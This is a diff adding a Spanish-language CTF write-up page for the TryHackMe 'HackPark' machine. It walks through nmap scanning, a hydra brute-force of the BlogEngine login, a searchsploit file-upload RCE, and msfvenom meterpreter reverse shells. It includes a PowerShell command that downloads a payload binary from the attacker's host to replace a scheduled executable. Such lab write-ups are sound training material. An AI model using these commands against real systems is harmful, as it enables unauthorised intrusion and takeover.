@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="es" data-bs-theme="dark">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>THM - HackPark | cat4clysm</title>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" />
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css" rel="stylesheet" />
+  <link href="../style.css" rel="stylesheet" />
+  <link href="writeup.css" rel="stylesheet" />
+</head>
+<body>
+  <nav class="navbar navbar-dark fixed-top" id="mainNav">
+    <div class="container">
+      <a class="navbar-brand fw-bold text-danger" href="../index.html">&gt;_ cat4clysm</a>
+      <a href="../index.html#writeups" class="btn btn-sm btn-outline-secondary"><i class="bi bi-arrow-left"></i> Volver</a>
+    </div>
+  </nav>
+  <main class="container py-5 mt-5">
+    <div class="writeup-header p-4 rounded mb-4">
+      <div class="d-flex flex-wrap gap-2 mb-3">
+        <span class="badge bg-info text-dark fs-6">TryHackMe</span>
+        <span class="badge bg-success fs-6">Medium</span>
+        <span class="badge bg-secondary">Windows</span>
+        <span class="badge bg-secondary">BlogEngine</span>
+        <span class="badge bg-secondary">Hydra</span>
+        <span class="badge bg-secondary">File Upload</span>
+        <span class="badge bg-secondary">SystemScheduler</span>
+      </div>
+      <h1 class="text-white fw-bold mb-1">HackPark</h1>
+      <p class="text-secondary mb-3">BlogEngine 3.3.6 con brute force hydra; RCE via PostView.ascx upload; escalada reemplazando Message.exe.</p>
+      <div class="d-flex flex-wrap gap-3 text-secondary small">
+        <span><i class="bi bi-person"></i> cat4clysm</span>
+      </div>
+    </div>
+    <div class="mb-4">
+      <h5 class="text-danger border-left-red mb-3"><i class="bi bi-tools"></i> Herramientas utilizadas</h5>
+      <div class="d-flex flex-wrap gap-2">
+        <span class="badge bg-dark border border-secondary p-2">nmap</span>
+        <span class="badge bg-dark border border-secondary p-2">hydra</span>
+        <span class="badge bg-dark border border-secondary p-2">searchsploit</span>
+        <span class="badge bg-dark border border-secondary p-2">msfvenom</span>
+        <span class="badge bg-dark border border-secondary p-2">netcat</span>
+      </div>
+    </div>
+        <section class="mb-5">
+      <h4 class="text-info border-left-info mb-3"><i class="bi bi-search"></i> Scanning</h4>
+      <div class="code-block mb-3">
+        <div class="code-header"><span class="text-success">root@kali</span><span class="text-white">:~$</span></div>
+        <pre><code>nmap -sC -sV -p 80,3389 -Pn -n 10.10.65.121 -oN targeted</code></pre>
+      </div><img src="img/thm-hackpark/0408130121.png" class="img-fluid rounded mb-3 border border-secondary" alt="nmap scan">
+      
+    </section>
+    <section class="mb-5">
+      <h4 class="text-danger border-left-danger mb-3"><i class="bi bi-key"></i> BlogEngine 3.3.6 - Brute Force</h4>
+      <img src="img/thm-hackpark/0408140240.png" class="img-fluid rounded mb-3 border border-secondary" alt="login page">
+      <div class="code-block mb-3">
+        <div class="code-header"><span class="text-success">root@kali</span><span class="text-white">:~$</span></div>
+        <pre><code>hydra -l admin -P /usr/share/wordlists/rockyou.txt -V 10.10.65.121 http-post-form '/Account/login.aspx?ReturnURL=/admin/:__VIEWSTATE=...&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^...:Login failed'</code></pre>
+      </div><img src="img/thm-hackpark/0408140248.png" class="img-fluid rounded mb-3 border border-secondary" alt="hydra result">
+      
+    </section>
+    <section class="mb-5">
+      <h4 class="text-danger border-left-danger mb-3"><i class="bi bi-lightning-charge"></i> Explotacion - BlogEngine RCE</h4>
+      <div class="code-block mb-3">
+        <div class="code-header"><span class="text-success">root@kali</span><span class="text-white">:~$</span></div>
+        <pre><code>searchsploit blogengine 3.3.6
+searchsploit -m aspx/webapps/46353.cs</code></pre>
+      </div><p class="text-secondary">Modificamos el exploit con nuestra IP/puerto y lo renombramos a <code>PostView.ascx</code>.</p>
+      <p class="text-secondary">Lo subimos via File Manager en <code>/admin/app/editor/editpost.cshtml</code>.</p>
+      <p class="text-secondary">Accedemos a <code>http://10.10.10.10/?theme=../../App_Data/files</code> con nc escuchando.</p>
+      <img src="img/thm-hackpark/0408200825.png" class="img-fluid rounded mb-3 border border-secondary" alt="file upload">
+      <img src="img/thm-hackpark/0408200839.png" class="img-fluid rounded mb-3 border border-secondary" alt="shell">
+      
+    </section>
+    <section class="mb-5">
+      <h4 class="text-warning border-left-warning mb-3"><i class="bi bi-arrow-up-circle"></i> Escalada - SystemScheduler Message.exe</h4>
+      <div class="code-block mb-3">
+        <div class="code-header"><span class="text-success">root@kali</span><span class="text-white">:~$</span></div>
+        <pre><code>msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.13.13.243 LPORT=5555 -f exe -o meterpreter_shell.exe</code></pre>
+      </div><p class="text-secondary">Encontramos <code>C:\Program Files(x86)\SystemScheduler\Message.exe</code> reemplazable. Lo sustituimos con una reverse shell:</p>
+      <div class="code-block mb-3">
+        <div class="code-header"><span class="text-success">root@kali</span><span class="text-white">:~$</span></div>
+        <pre><code>msfvenom -p windows/meterpreter/reverse_tcp ... -f exe -o Message.exe</code></pre>
+      </div><div class="code-block mb-3"><pre><code>powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.13.13.243:80/Message.exe','Message.exe')"</code></pre></div><p class="text-secondary">Despues de unos segundos obtenemos sesion de Administrator.</p>
+      
+    </section>
+    <section class="mb-5">
+      <h4 class="text-success border-left-success mb-3"><i class="bi bi-lightbulb"></i> Lecciones aprendidas</h4>
+      <ul class="text-secondary"><li>BlogEngine 3.3.6 tiene una vulnerabilidad de file upload que permite RCE via PostView.ascx.</li>
+<li>Los servicios programados que ejecutan binarios reemplazables son vectores de escalada.</li>
+<li>Winpeas automatiza la busqueda de vectores de escalada en Windows.</li></ul>
+    </section>
+  </main>
+  <footer class="py-4 text-center border-top border-secondary">
+    <p class="text-secondary mb-0"><span class="text-danger">&gt;_</span> cat4clysm &copy; 2025 &nbsp;&#183;&nbsp;<span class="text-muted">Hack the planet.</span></p>
+  </footer>
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
+</body>
+</html>
